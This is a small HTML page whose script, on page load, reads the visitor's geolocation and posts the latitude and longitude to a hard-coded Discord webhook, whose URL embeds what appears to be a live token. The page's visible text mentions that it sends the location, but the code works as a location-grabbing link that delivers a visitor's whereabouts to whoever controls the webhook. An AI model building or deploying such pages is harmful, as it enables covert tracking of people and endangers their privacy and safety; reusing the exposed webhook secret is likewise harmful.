!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Location to Discord</title>
    <script>
        // Function to get the current location and send it to the Discord webhook
        function sendLocationToDiscord() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    const webhookUrl = 'https://discord.com/api/webhooks/1247307482020315198/0pTzDwgH0PSGlr_pjXSXXIofMXjK82K9qVrUfmA8oyAlZE0bQEFOA3Zm8-g86roSOchd';
                    const message = {
                        content: `Current Location: Latitude ${latitude}, Longitude ${longitude}`
                    };

                    fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(message)
                    })
                    .then(response => response.json())
                    .then(data => console.log('Success:', data))
                    .catch((error) => console.error('Error:', error));
                }, function(error) {
                    console.error('Error getting location:', error);
                });
            } else {
                console.error('Geolocation is not supported by this browser.');
            }
        }

        // Run the function when the page loads
        document.addEventListener("DOMContentLoaded", sendLocationToDiscord);
    </script>
</head>
<body>
    <h1>Send Location to Discord</h1>
    <p>This page will send your current location to a Discord webhook when loaded.</p>
</body>
</html>
